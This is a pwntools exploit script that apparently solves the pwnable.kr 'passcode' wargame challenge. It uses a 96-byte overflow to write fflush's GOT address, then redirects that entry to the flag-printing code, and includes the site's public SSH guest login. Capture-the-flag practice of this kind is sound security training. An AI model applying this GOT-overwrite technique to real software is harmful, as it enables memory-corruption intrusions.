#!/usr/bin/env python3

from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        pty = process.PTY
        return gdb.debug([exe] + argv, gdbscript=gdbscript, stdin=pty, stdout=pty,
                         *a, **kw)
    elif args.REMOTE: # Remote on pwnable server
        conn = ssh(host='pwnable.kr', user='passcode', password='guest', port=2222)
        return conn.process(exe)
    else:  # Run locally
        pty = process.PTY
        return process(exe, stdin=pty, stdout=pty)


# Specify your GDB script here for debugging
gdbscript = '''
b login 
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './passcode'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
#context.log_level = 'debug'

# ===========================================================
#                    START OF EXPLOIT
# ===========================================================

io = start()

FFLUSH_ADDR = 0x0804a004

padding = 96
payload = flat(
    b'A' * padding,
    FFLUSH_ADDR.to_bytes(4, 'little')
)

# Send the payload
io.sendlineafter(b': ', payload)

SYSTEM_ADDR = str(0x80485e3).encode()

# Redirect FFLUSH to /bin/cat/flag
io.sendlineafter(b': ', SYSTEM_ADDR)

# Get flag
flag = io.recvline()
io.close()

print("\nFlag:", flag.decode())
